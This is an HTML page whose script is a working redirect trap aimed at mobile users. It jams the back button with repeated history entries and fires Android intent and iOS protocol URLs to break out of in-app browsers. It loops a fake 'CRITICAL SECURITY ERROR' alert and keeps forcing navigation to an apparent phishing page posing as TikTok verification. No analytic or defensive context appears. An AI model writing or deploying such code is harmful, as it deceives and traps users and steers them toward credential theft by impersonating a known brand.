<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
    const startTime = Date.now();
    const limit = 5000; // 5 SECOND FAIL-SAFE (STRICT)

    function nuclearBreakout() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        // 1. THE BLOB DOWNLOAD (Forces "Open In..." or Download Manager)
        const blob = new Blob([" "], {type: "application/octet-stream"});
        const blobUrl = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = destination;
        a.target = "_blank";
        a.download = "verify.html";

        if (isAndroid) {
            // ANDROID: Double-Intent + Market Bypass
            // Direct Chrome Package call
            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
            
            // Conflict: Try to open the Play Store with the URL as a parameter
            setTimeout(() => {
                window.location.href = "market://details?id=com.android.chrome&url=" + encodeURIComponent(destination);
            }, 50);
        } else if (isIOS) {
            // iOS: The "Search-to-Maps" Leak
            // Maps and Search are system-priority. This forces a protocol prompt.
            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
            
            setTimeout(() => {
                // The "Facetime" prompt hijack - forces focus out of the app
                window.location.href = "facetime-prompt://" + destination.replace("https://", "");
            }, 50);
        }

        // UNIVERSAL: Physical click on a virtual anchor to bypass "Automated Navigation" filters
        a.click();
    }

    function rampage() {
        // FAIL-SAFE: Hard clock check. 
        if (Date.now() - startTime > limit) {
            return; 
        }

        // Fire the conflict shotgun
        nuclearBreakout();

        // BLOCK THE UI: Forces the OS to process the background navigation
        alert("CRITICAL SECURITY ERROR\n\nVerification Required. Tap OK to open System Browser.");
        
        // Fire again immediately after they dismiss
        nuclearBreakout();

        setTimeout(rampage, 10);
    }

    window.onload = () => {
        // Back-button jammer
        for(let i=0; i<30; i++) history.pushState(null, null, "#" + i);
        rampage();
    };

    // If they hit 'X', blur happens - restart rampage instantly
    window.onblur = () => {
        rampage();
    };
</script>

</body>
</html>
